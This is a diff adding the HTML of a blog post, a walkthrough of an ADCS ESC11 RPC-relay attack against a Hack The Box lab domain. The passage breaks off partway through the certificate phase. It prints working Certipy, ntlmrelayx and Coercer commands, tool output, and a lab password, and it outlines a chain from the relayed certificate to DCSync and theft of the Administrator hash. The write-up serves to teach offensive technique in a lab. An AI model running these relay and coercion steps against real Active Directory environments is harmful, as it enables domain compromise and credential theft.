@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Active Directory Certificate Services: Abusing ADCS ESC11 (RPC Relay) | IamWin&#39;s Blog</title>
+<meta name="keywords" content="ADCS, ESC11, NTLM Relay, RPC Relay, Active Directory, Red Team, Privilege Escalation">
+<meta name="description" content="Introduction
+ESC11 is a vulnerability in Active Directory Certificate Services (ADCS) that occurs when the RPC interface of the Certificate Authority (CA) — specifically the ICertPassage (MS-ICPR) interface — does not enforce signing or encryption for certificate enrollment requests. This happens because the IF_ENFORCEENCRYPTICERTREQUEST flag is disabled on the CA.
+Since no packet signing or encryption is required on this RPC interface, it becomes vulnerable to NTLM Relay attacks. If an attacker manages to coerce the NTLM authentication of a privileged account (such as the machine account of a Domain Controller or a Domain Admin), they can relay that authentication to the CA&rsquo;s RPC port and request a valid certificate on behalf of the victim.">
+<meta name="author" content="Jean aka IamWin">
+<link rel="canonical" href="//localhost:1313/posts/esc11/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.53413bb33de4d2cf6896b98c4b757f98a54bd95f1e515de5819fe588d4970a3b.css" integrity="sha256-U0E7sz3k0s9olrmMS3V/mKVL2V8eUV3lgZ/liNSXCjs=" rel="preload stylesheet" as="style">
+<link rel="icon" href="//localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="//localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="//localhost:1313/posts/esc11/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="//localhost:1313/posts/esc11/">
+  <meta property="og:site_name" content="IamWin&#39;s Blog">
+  <meta property="og:title" content="Active Directory Certificate Services: Abusing ADCS ESC11 (RPC Relay)">
+  <meta property="og:description" content="Introduction ESC11 is a vulnerability in Active Directory Certificate Services (ADCS) that occurs when the RPC interface of the Certificate Authority (CA) — specifically the ICertPassage (MS-ICPR) interface — does not enforce signing or encryption for certificate enrollment requests. This happens because the IF_ENFORCEENCRYPTICERTREQUEST flag is disabled on the CA.
+Since no packet signing or encryption is required on this RPC interface, it becomes vulnerable to NTLM Relay attacks. If an attacker manages to coerce the NTLM authentication of a privileged account (such as the machine account of a Domain Controller or a Domain Admin), they can relay that authentication to the CA’s RPC port and request a valid certificate on behalf of the victim.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-06-28T21:30:00-05:00">
+    <meta property="article:modified_time" content="2026-06-28T21:30:00-05:00">
+    <meta property="article:tag" content="ADCS">
+    <meta property="article:tag" content="ESC11">
+    <meta property="article:tag" content="NTLM Relay">
+    <meta property="article:tag" content="RPC Relay">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="Red Team">
+    <meta property="og:image" content="//localhost:1313/assets/img/ESC11_Ghostlink/portada.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="//localhost:1313/assets/img/ESC11_Ghostlink/portada.png">
+  <meta name="twitter:title" content="Active Directory Certificate Services: Abusing ADCS ESC11 (RPC Relay)">
+  <meta name="twitter:description" content="Introduction ESC11 is a vulnerability in Active Directory Certificate Services (ADCS) that occurs when the RPC interface of the Certificate Authority (CA) — specifically the ICertPassage (MS-ICPR) interface — does not enforce signing or encryption for certificate enrollment requests. This happens because the IF_ENFORCEENCRYPTICERTREQUEST flag is disabled on the CA.
+Since no packet signing or encryption is required on this RPC interface, it becomes vulnerable to NTLM Relay attacks. If an attacker manages to coerce the NTLM authentication of a privileged account (such as the machine account of a Domain Controller or a Domain Admin), they can relay that authentication to the CA’s RPC port and request a valid certificate on behalf of the victim.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": "[{\"@type\":\"ListItem\",\"item\":\"//localhost:1313/posts/\",\"name\":\"Posts\",\"position\":1},{\"@type\":\"ListItem\",\"item\":\"//localhost:1313/posts/esc11/\",\"name\":\"Active Directory Certificate Services: Abusing ADCS ESC11 (RPC Relay)\",\"position\":2}]"
+}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "\"Active Directory Certificate Services: Abusing ADCS ESC11 (RPC Relay)\"",
+  "name": "\"Active Directory Certificate Services: Abusing ADCS ESC11 (RPC Relay)\"",
+  "description": "\"Introduction ESC11 is a vulnerability in Active Directory Certificate Services (ADCS) that occurs when the RPC interface of the Certificate Authority (CA) — specifically the ICertPassage (MS-ICPR) interface — does not enforce signing or encryption for certificate enrollment requests. This happens because the IF_ENFORCEENCRYPTICERTREQUEST flag is disabled on the CA.\\nSince no packet signing or encryption is required on this RPC interface, it becomes vulnerable to NTLM Relay attacks. If an attacker manages to coerce the NTLM authentication of a privileged account (such as the machine account of a Domain Controller or a Domain Admin), they can relay that authentication to the CA\\u0026rsquo;s RPC port and request a valid certificate on behalf of the victim.\\n\"",
+  "keywords": "[\"ADCS\",\"ESC11\",\"NTLM Relay\",\"RPC Relay\",\"Active Directory\",\"Red Team\",\"Privilege Escalation\"]",
+  "datePublished": "\"2026-06-28T21:30:00-05:00\"",
+  "dateModified": "\"2026-06-28T21:30:00-05:00\"",
+  "author": {
+    "@type": "Person",
+    "name": "\"Jean aka IamWin\""
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "\"//localhost:1313/posts/esc11/\""
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "\"IamWin's Blog\"",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "\"//localhost:1313/favicon.ico\""
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="//localhost:1313/" accesskey="h" title="Home (Alt + H)">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="//localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Active Directory Certificate Services: Abusing ADCS ESC11 (RPC Relay)
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-06-28 21:30:00 -0500 -05'>June 28, 2026</span>&nbsp;·&nbsp;<span>Jean aka IamWin</span>
+
+</div>
+  </header> 
+<figure class="entry-cover">
+        <img loading="eager" src="//localhost:1313/assets/img/ESC11_Ghostlink/portada.png" alt="">
+        
+</figure><details class="toc"  open>
+    <summary accesskey="c" title="(Alt + C)">
+        <span class="title">Table of Contents</span>
+    </summary>
+
+    <div class="inner"><ul>
+            <li>
+                <a href="#introduction" aria-label="Introduction">Introduction</a><ul>
+                    
+            <li>
+                <a href="#why-is-this-critical" aria-label="Why is this critical?">Why is this critical?</a></li></ul>
+            </li>
+            <li>
+                <a href="#scenario" aria-label="Scenario">Scenario</a></li>
+            <li>
+                <a href="#phase-1-adcs-enumeration" aria-label="Phase 1: ADCS Enumeration">Phase 1: ADCS Enumeration</a></li>
+            <li>
+                <a href="#phase-2-environment-setup" aria-label="Phase 2: Environment Setup">Phase 2: Environment Setup</a></li>
+            <li>
+                <a href="#phase-3-attack-execution" aria-label="Phase 3: Attack Execution">Phase 3: Attack Execution</a><ul>
+                    
+            <li>
+                <a href="#step-1-set-up-the-relay" aria-label="Step 1: Set Up the Relay">Step 1: Set Up the Relay</a></li>
+            <li>
+                <a href="#step-2-dc-coercion-with-coercer" aria-label="Step 2: DC Coercion with Coercer">Step 2: DC Coercion with Coercer</a></li></ul>
+            </li>
+            <li>
+                <a href="#relay-flow" aria-label="Relay Flow">Relay Flow</a></li>
+            <li>
+                <a href="#phase-4-obtaining-the-certificate" aria-label="Phase 4: Obtaining the Certificate">Phase 4: Obtaining the Certificate</a></li>
+            <li>
+                <a href="#phase-5-from-certificate-to-domain-admin" aria-label="Phase 5: From Certificate to Domain Admin">Phase 5: From Certificate to Domain Admin</a><ul>
+                    
+            <li>
+                <a href="#what-happened-under-the-hood" aria-label="What happened under the hood?">What happened under the hood?</a>
+            </li>
+        </ul>
+        </li>
+        </ul>
+    </div>
+</details>
+
+  <div class="post-content md-content"><h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
+<p><strong>ESC11</strong> is a vulnerability in <strong>Active Directory Certificate Services (ADCS)</strong> that occurs when the RPC interface of the Certificate Authority (CA) — specifically the <strong>ICertPassage (MS-ICPR)</strong> interface — does not enforce signing or encryption for certificate enrollment requests. This happens because the <code>IF_ENFORCEENCRYPTICERTREQUEST</code> flag is disabled on the CA.</p>
+<p>Since no packet signing or encryption is required on this RPC interface, it becomes vulnerable to <strong>NTLM Relay</strong> attacks. If an attacker manages to coerce the NTLM authentication of a privileged account (such as the machine account of a Domain Controller or a Domain Admin), they can relay that authentication to the CA&rsquo;s RPC port and request a valid certificate on behalf of the victim.</p>
+<h3 id="why-is-this-critical">Why is this critical?<a hidden class="anchor" aria-hidden="true" href="#why-is-this-critical">#</a></h3>
+<blockquote>
+<p><strong>Why do we coerce the DC and not another machine?</strong></p>
+<p>We need a certificate using the <strong>DomainController</strong> template. This template allows unconstrained delegation and provides us with a certificate we can use to authenticate as the Domain Controller itself (<code>DC01$</code>).</p>
+<p>The <code>DC01$</code> account has <strong>Enroll</strong> permissions on the CA (like any <em>Authenticated User</em>), and the <code>DomainController</code> template is available in the environment.</p>
+</blockquote>
+<p>If we obtain a certificate for <code>DC01$</code>, we can execute the following attack chain:</p>
+<p><code>DC01$ Certificate ──&gt; PKINIT (Request TGT) ──&gt; Extract NT Hash ──&gt; DCSync (NTDS.dit) ──&gt; Admin Hash</code></p>
+<ol>
+<li><strong>Request a TGT:</strong> We obtain the ticket for <code>DC01$</code> using the newly issued certificate.</li>
+<li><strong>Extract the NT hash:</strong> We retrieve the machine account hash during the TGT request via PKINIT.</li>
+<li><strong>Execute DCSync:</strong> We use the DC hash against <code>NTDS.dit</code> to dump all domain secrets.</li>
+<li><strong>Full compromise:</strong> We steal the <code>Administrator</code> user hash to gain complete control of the environment.</li>
+</ol>
+<h2 id="scenario">Scenario<a hidden class="anchor" aria-hidden="true" href="#scenario">#</a></h2>
+<p>The scenario in which I worked this vulnerability was on the <strong>Ghostlink</strong> machine from Hack The Box, which presents the following infrastructure:</p>
+<p><img alt="Lab infrastructure diagram" loading="lazy" src="/assets/img/ESC11_Ghostlink/arch.png"></p>
+<p>To elaborate further:</p>
+<pre tabindex="0"><code>10.10.15.174   Kali-Linux             → Attacker machine
+172.16.20.20   gpz-op26-toolkits      → Compromised machine used as a pivot to reach the CA
+172.16.20.10   gpz-op26-secure        → CA (Certificate Authority) ghostlink-GPZ-OP26-SECURE-CA
+10.129.41.180  DC01.ghostlink.local   → Domain Controller
+</code></pre><h2 id="phase-1-adcs-enumeration">Phase 1: ADCS Enumeration<a hidden class="anchor" aria-hidden="true" href="#phase-1-adcs-enumeration">#</a></h2>
+<p>First, we need to confirm whether ADCS exists in the domain and whether any CA has the ESC11 vulnerability.</p>
+<p>With <strong>NetExec</strong> we identify that a CA exists in the domain:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  Ghostlink nxc ldap dc01.ghostlink.htb -u <span style="color:#e6db74">&#39;nvirelli&#39;</span> -p u47YUclrDiwWxBheaSzI -M adcs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>LDAP   10.129.42.12    <span style="color:#ae81ff">389</span>   DC01        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">11</span> / Server <span style="color:#ae81ff">2025</span> Build <span style="color:#ae81ff">26100</span> <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:ghostlink.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:Enforced<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:When Supported<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>LDAP    10.129.42.12   <span style="color:#ae81ff">389</span>   DC01        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ghostlink.htb<span style="color:#ae81ff">\n</span>virelli:u47YUclrDiwWxBheaSzI
+</span></span><span style="display:flex;"><span>ADCS    10.129.42.12   <span style="color:#ae81ff">389</span>   DC01        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting LDAP search with search filter <span style="color:#e6db74">&#39;(objectClass=pKIEnrollmentService)&#39;</span>
+</span></span><span style="display:flex;"><span>ADCS    10.129.42.12   <span style="color:#ae81ff">389</span>   DC01        Found PKI Enrollment Server: gpz-op26-secure.ghostlink.htb
+</span></span><span style="display:flex;"><span>ADCS    10.129.42.12   <span style="color:#ae81ff">389</span>   DC01        Found CN: ghostlink-GPZ-OP26-SECURE-CA
+</span></span></code></pre></div><p>The CA is confirmed and found on the gpz-op26-secure machine.</p>
+<p>We now check CA vulnerabilities with <strong>Certipy</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  Ghostlink certipy find -u <span style="color:#e6db74">&#39;nvirelli@ghostlink.htb&#39;</span> -p <span style="color:#e6db74">&#39;u47YUclrDiwWxBheaSzI&#39;</span> -dc-host dc01.ghostlink.htb -ns 10.129.41.180 -dns-tcp -vulnerable -stdout
+</span></span><span style="display:flex;"><span>Certipy v5.1.0 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">33</span> certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate authorities
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> certificate authority
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">11</span> enabled certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">13</span> issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">0</span> OIDs linked to templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;ghostlink-GPZ-OP26-SECURE-CA&#39;</span> via RRP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully retrieved CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;ghostlink-GPZ-OP26-SECURE-CA&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking web enrollment <span style="color:#66d9ef">for</span> CA <span style="color:#e6db74">&#39;ghostlink-GPZ-OP26-SECURE-CA&#39;</span> @ <span style="color:#e6db74">&#39;gpz-op26-secure.ghostlink.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: timed out
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumeration output:
+</span></span><span style="display:flex;"><span>Certificate Authorities
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    CA Name                             : ghostlink-GPZ-OP26-SECURE-CA
+</span></span><span style="display:flex;"><span>    DNS Name                            : gpz-op26-secure.ghostlink.htb
+</span></span><span style="display:flex;"><span>    Certificate Subject                 : CN<span style="color:#f92672">=</span>ghostlink-GPZ-OP26-SECURE-CA, DC<span style="color:#f92672">=</span>ghostlink, DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    Certificate Serial Number           : 3F4302F3D68A6AAE4B792DB93F31CCE5
+</span></span><span style="display:flex;"><span>    Certificate Validity Start          : 2026-03-03 16:52:14+00:00
+</span></span><span style="display:flex;"><span>    Certificate Validity End            : 2126-03-03 17:02:12+00:00
+</span></span><span style="display:flex;"><span>    Web Enrollment
+</span></span><span style="display:flex;"><span>      HTTP
+</span></span><span style="display:flex;"><span>        Enabled                         : True
+</span></span><span style="display:flex;"><span>      HTTPS
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>    User Specified SAN                  : Disabled
+</span></span><span style="display:flex;"><span>    Request Disposition                 : Issue
+</span></span><span style="display:flex;"><span>    Enforce Encryption <span style="color:#66d9ef">for</span> Requests     : Disabled
+</span></span><span style="display:flex;"><span>    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+</span></span><span style="display:flex;"><span>    Permissions
+</span></span><span style="display:flex;"><span>      Owner                             : GHOSTLINK.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>      Access Rights
+</span></span><span style="display:flex;"><span>        ManageCa                        : GHOSTLINK.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>                                          GHOSTLINK.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          GHOSTLINK.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        ManageCertificates              : GHOSTLINK.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>                                          GHOSTLINK.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          GHOSTLINK.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Enroll                          : GHOSTLINK.HTB<span style="color:#ae81ff">\A</span>uthenticated Users
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Vulnerabilities
+</span></span><span style="display:flex;"><span>      ESC8                              : Web Enrollment is enabled over HTTP.
+</span></span><span style="display:flex;"><span>      ESC11                             : Encryption is not enforced <span style="color:#66d9ef">for</span> ICPR <span style="color:#f92672">(</span>RPC<span style="color:#f92672">)</span> requests.
+</span></span><span style="display:flex;"><span>Certificate Templates                   : <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find any certificate templates
+</span></span></code></pre></div><p><strong>Enforce Encryption for Requests     : Disabled</strong></p>
+<p>This means we can intercept the NTLM authentication of any privileged machine and relay it as-is to the CA to obtain a certificate.</p>
+<p><img alt="Certipy ESC11 finding" loading="lazy" src="/assets/img/ESC11_Ghostlink/certipy_01.png"></p>
+<h2 id="phase-2-environment-setup">Phase 2: Environment Setup<a hidden class="anchor" aria-hidden="true" href="#phase-2-environment-setup">#</a></h2>
+<p>To better understand the attack flow, it is necessary to detail the environment structure. As mentioned above, the CA (<code>gpz-op26-secure.ghostlink.htb</code>) is on a different network segment (<code>172.16.20.0/24</code>) and our Kali Linux attacker machine is on the <code>10.10.15.0/24</code> network. To resolve this lack of direct connectivity, we use <strong>Ligolo-ng</strong> to establish a tunnel and pivot through the <code>gpz-op26-toolkits</code> machine (172.16.20.20), which has visibility into both networks.</p>
+<p><img alt="Ligolo-ng tunnel setup" loading="lazy" src="/assets/img/ESC11_Ghostlink/ligolo.png"></p>
+<p>With this configuration in place, we now have direct addressing and access to the CA.</p>
+<h2 id="phase-3-attack-execution">Phase 3: Attack Execution<a hidden class="anchor" aria-hidden="true" href="#phase-3-attack-execution">#</a></h2>
+<p>This is where it gets interesting — the attack itself.</p>
+<h3 id="step-1-set-up-the-relay">Step 1: Set Up the Relay<a hidden class="anchor" aria-hidden="true" href="#step-1-set-up-the-relay">#</a></h3>
+<p>ntlmrelayx will listen to intercept the DC&rsquo;s authentication and relay it to the CA.
+Open a terminal and run:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>➜  Ghostlink sudo ~/venv/esc11/bin/ntlmrelayx.py -t rpc://172.16.20.10 -rpc-mode ICPR -icpr-ca-name <span style="color:#e6db74">&#39;ghostlink-GPZ-OP26-SECURE-CA&#39;</span> -smb2support --template DomainController
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th style="text-align: left">Parameter</th>
+					<th style="text-align: left">What it does</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: left"><code>-t rpc://172.16.20.10</code></td>
+					<td style="text-align: left">Relay target: the CA via RPC protocol</td>
+			</tr>
+			<tr>
+					<td style="text-align: left"><code>-rpc-mode ICPR</code></td>
+					<td style="text-align: left">Uses the <code>ICertPassage</code> interface (the one that processes certificates)</td>
+			</tr>
+			<tr>
+					<td style="text-align: left"><code>-icpr-ca-name '...'</code></td>
+					<td style="text-align: left">Name of the CA to request the certificate from</td>
+			</tr>
+			<tr>
+					<td style="text-align: left"><code>--template DomainController</code></td>
+					<td style="text-align: left">Certificate template we are going to request</td>
+			</tr>
+	</tbody>
+</table>
+<p>At this point, the relay is waiting for incoming connections.</p>
+<h3 id="step-2-dc-coercion-with-coercer">Step 2: DC Coercion with Coercer<a hidden class="anchor" aria-hidden="true" href="#step-2-dc-coercion-with-coercer">#</a></h3>
+<p>To force the Domain Controller to authenticate toward our Kali machine (where the relay is waiting), we run <strong>Coercer</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>coercer coerce <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -l 10.10.15.174 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -t dc01.ghostlink.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d ghostlink.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -u nvirelli <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -p <span style="color:#e6db74">&#39;u47YUclrDiwWxBheaSzI&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --dc-ip 10.129.41.180
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th style="text-align: left">Parameter</th>
+					<th style="text-align: left">What it does</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: left"><code>coerce</code></td>
+					<td style="text-align: left">Attack mode: forces the target to authenticate against us</td>
+			</tr>
+			<tr>
+					<td style="text-align: left"><code>-l 10.10.15.174</code></td>
+					<td style="text-align: left">Listener IP (our Kali). The DC will connect to this IP</td>
+			</tr>
+			<tr>
+					<td style="text-align: left"><code>-t dc01.ghostlink.htb</code></td>
+					<td style="text-align: left">Target (the machine we want to coerce). Can be IP or hostname</td>
+			</tr>
+			<tr>
+					<td style="text-align: left"><code>-d ghostlink.htb</code></td>
+					<td style="text-align: left">Domain the user belongs to</td>
+			</tr>
+			<tr>
+					<td style="text-align: left"><code>-u nvirelli</code></td>
+					<td style="text-align: left">User we authenticate with to the DC to send the RPC calls</td>
+			</tr>
+			<tr>
+					<td style="text-align: left"><code>-p 'u47YUclrDiwWxBheaSzI'</code></td>
+					<td style="text-align: left">User password</td>
+			</tr>
+			<tr>
+					<td style="text-align: left"><code>--dc-ip 10.129.41.180</code></td>
+					<td style="text-align: left">DC IP (required because the hostname resolves to the same IP and Coercer needs to know where the DC is)</td>
+			</tr>
+	</tbody>
+</table>
+<blockquote>
+<p><strong>What does this mean?</strong>
+We use <code>nvirelli</code>&rsquo;s credentials to invoke RPC methods on the DC and force it to initiate an outbound connection to our IP (<code>10.10.15.174</code>).</p>
+</blockquote>
+<p>When Coercer prompts to continue through the various methods and protocols, enter <code>C</code> (<em>Continue</em>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Continue (C) | Skip this function (S) | Stop exploitation (X) ?
+</span></span></code></pre></div><p>Press <code>C</code> to continue (Coercer will try various methods/protocols until it forces the connection to our listener IP).</p>
+<p><img alt="Relay flow with certificate obtained" loading="lazy" src="/assets/img/ESC11_Ghostlink/flujo_pfx.png"></p>
+<h2 id="relay-flow">Relay Flow<a hidden class="anchor" aria-hidden="true" href="#relay-flow">#</a></h2>
+<p>When we run both commands in parallel, the network-level attack flow follows this order:</p>
+<p><img alt="Full relay flow diagram" loading="lazy" src="/assets/img/ESC11_Ghostlink/flujo.png"></p>
+<h2 id="phase-4-obtaining-the-certificate">Phase 4: Obtaining the Certificate<a hidden class="anchor" aria-hidden="true" href="#phase-4-obtaining-the-certificate">#</a></h2>
+<p>As seen in the ntlmrelayx output, the certificate was successfully obtained using the <code>DomainController</code> template:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>RPC<span style="color:#f92672">)</span>: Received connection from 10.129.41.180, attacking target rpc://172.16.20.10
